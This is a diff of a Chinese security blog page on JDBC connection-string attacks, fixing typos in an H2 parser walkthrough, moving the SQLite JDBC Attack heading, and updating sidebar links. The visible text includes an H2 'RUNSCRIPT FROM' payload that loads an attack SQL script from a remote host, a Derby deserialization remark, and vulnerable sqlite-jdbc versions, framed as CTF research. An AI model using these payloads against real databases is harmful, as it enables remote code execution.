@@ -868,7 +868,7 @@
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129201226637.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129201226637.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>这就是解析JDBC字符串的关键了，会循环地去匹配字符开头：比如我们字符串为<code>RUNSCRIPT FROM &#39;http://127.0.0.1:8888/h2_JDBC_Attack.sql&#39;</code>，开头R进入case 调用readR</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130201248730.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130201248730.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>readR先调用findIdentifierEnd去查找keyword关键字，这里已经找到RSCRIPT，不过RIGHT EOW ROWNUM需要优先依次进行匹配，未匹配到最后调用readIdentifierOrKeyword。这里就完成了提取RUNSCRIPT</p>
+<p>readR先调用findIdentifierEnd去查找keyword关键字，这里已经找到RUNSCRIPT，不过RIGHT ROW ROWNUM需要优先依次进行匹配，未匹配到最后调用readIdentifierOrKeyword。这里就完成了提取RUNSCRIPT</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130201500903.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130201500903.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>接着空格略过</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202515115.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202515115.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
@@ -951,13 +951,13 @@
 <p>该函数会调用到org.apache.derby.impl.store.replication.net.SocketConnection.readMessage反序列化InputStream</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201104834485.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201104834485.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>直接打字节码即可</p>
+<h2 id="SQLite-JDBC-Attack"><a href="#SQLite-JDBC-Attack" class="headerlink" title="SQLite JDBC Attack"></a>SQLite JDBC Attack</h2><p>这个数据库出现的很少，但ctf就喜欢考少见的东西。由于24ciscn涉及就来复现一下</p>
 <p>与大多数其他 SQL 数据库不同，SQLite 没有单独的服务器进程。SQLite 直接读取和写入普通磁盘文件。一个完整的 SQL 数据库（包含多个表、索引、触发器和视图）包含在单个磁盘文件中。</p>
 <p>3.6.14.1-3.41.2.1为漏洞版本，3.41.2.2为安全版本</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.xerial<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sqlite-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="SQLite-JDBC-Attack"><a href="#SQLite-JDBC-Attack" class="headerlink" title="SQLite JDBC Attack"></a>SQLite JDBC Attack</h2><p>这个数据库出现的很少，但ctf就喜欢考少见的东西。由于24ciscn涉及就来复现一下</p>
 <p>JDBC中，sqlite参数相当于执行对应的PRAGMA的SQL语句，比如下面两句等价</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jdbc:sqlite:file:default.db?cache_size<span class="operator">=</span><span class="number">2000</span></span><br><span class="line">PRAGMA cache_size <span class="operator">=</span> <span class="number">2000</span></span><br></pre></td></tr></table></figure>
 
@@ -1355,6 +1355,27 @@ vulhub版环境搭建https://git
             
 
             <div class="post-img-box">
+              <a href="/2024/12/30/rasp-de-fang/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8127.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8127.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">12-30</span>
+                
+              </div>
+              <a class="post-title" href="/2024/12/30/rasp-de-fang/">RASP的防</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
               <a href="/2024/12/22/ciscn-2024-web-wp/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
                 <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8126.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8126.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
@@ -1430,27 +1451,6 @@ vulhub版环境搭建https://git
                 
               </div>
               <a class="post-title" href="/2024/12/19/aspectjweaver-fan-xu-lie-hua-xie-wen-jian/">AspectJWeaver反序列化写文件</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2024/12/09/ciscn-2023-web-wp/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8122.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8122.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">12-09</span>
-                
-              </div>
-              <a class="post-title" href="/2024/12/09/ciscn-2023-web-wp/">2023CISCN 初赛WEB WP</a>
             </div>
           </div>
         
